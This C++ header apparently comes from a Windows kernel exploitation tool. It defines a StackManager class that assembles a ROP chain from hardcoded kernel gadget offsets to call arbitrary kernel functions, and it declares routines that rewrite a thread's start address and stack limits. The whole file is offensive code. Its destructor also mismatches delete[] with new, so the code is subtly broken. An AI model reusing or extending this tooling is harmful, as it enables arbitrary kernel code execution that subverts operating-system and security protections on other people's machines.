#pragma once
#include <vector>
#include <string_view>
#include <include/driver/kernel_addresses.hpp>

class StackManager
{
private:
	std::vector<std::uint64_t>* Stack = nullptr;
	std::uintptr_t KernelModuleBase = NULL;
	std::uintptr_t StackAddress = NULL;
	std::size_t StackSize = NULL;
    void ModifyThreadField(const std::uint64_t FieldOffset, const std::uint64_t NewValue);

public:
	StackManager(const std::uintptr_t _KernelModuleBase, const std::uintptr_t _StackAddress, const size_t _StackSize = 0x3000)
		: KernelModuleBase(_KernelModuleBase), StackAddress(_StackAddress), StackSize(_StackSize)
	{
		Stack = new std::vector<uint64_t>;
		//Stack->push_back(StackAddress + StackSize);
	}

	~StackManager()
	{
		delete[] Stack;
	}

    std::uint64_t* GetStackBuffer();
    std::size_t GetStackSize();
    void AddGadget(const std::uint64_t GadgetOffset, const std::string_view& GadgetLogName);
    void AddValue(const std::uint64_t Value, const std::string_view& ValueLogName);
    void AddPadding(const std::size_t PaddingSize = 8);
    void ModifyThreadStartAddress(const std::uint64_t NewStartAddress);
    void ModifyThreadStackBaseAndLimit(const std::uint64_t NewStackBase, const std::uint64_t NewStackLimit);

    template<typename... Args>
    void AddFunctionCall(const std::string_view& FunctionName, Args&&... args)
    {
        constexpr std::size_t ArgCount = sizeof...(Args);
        const std::uint64_t FunctionAddress = Driver::GetKernelFunctionOffset(FunctionName);

        // Setup ropchain for arguments only if there are any
        if constexpr (ArgCount > 0)
        {
            std::uint64_t ConvertedArgs[] = { static_cast<std::uint64_t>(args)... };

            if (ArgCount >= 1)
            {
                this->AddGadget(0x24cd7b, "pop rcx; ret;"); // pop rcx; ret;
                this->AddValue(ConvertedArgs[0], "FirstArg");
            }

            if (ArgCount >= 2)
            {
                this->AddGadget(0x480032, "pop rdx; ret;"); // pop rdx; ret;
                this->AddValue(ConvertedArgs[1], "SecondArg");
            }

            if (ArgCount >= 3)
            {
                this->AddGadget(0x47f82d, "pop r8; ret;"); // pop r8; ret;
                this->AddValue(ConvertedArgs[2], "ThirdArg");
            }

            if (ArgCount >= 4)
            {
                this->AddGadget(0x6b3323, "pop r9; ret;"); // pop r9; ret;
                this->AddValue(ConvertedArgs[3], "FourthArg");
            }
        }

        if (this->GetStackSize() % 16 != 0)
            this->AddGadget(0x20043b, "ret (align)");

        this->AddGadget(FunctionAddress, "Function to call address");
        this->AddGadget(0xbac76a, "add rsp, 0x20; ret;");
        this->AddValue(0, "Shadow space 1");
        this->AddValue(0, "Shadow space 2");
        this->AddValue(0, "Shadow space 3");
        this->AddValue(0, "Shadow space 4");
    }
};
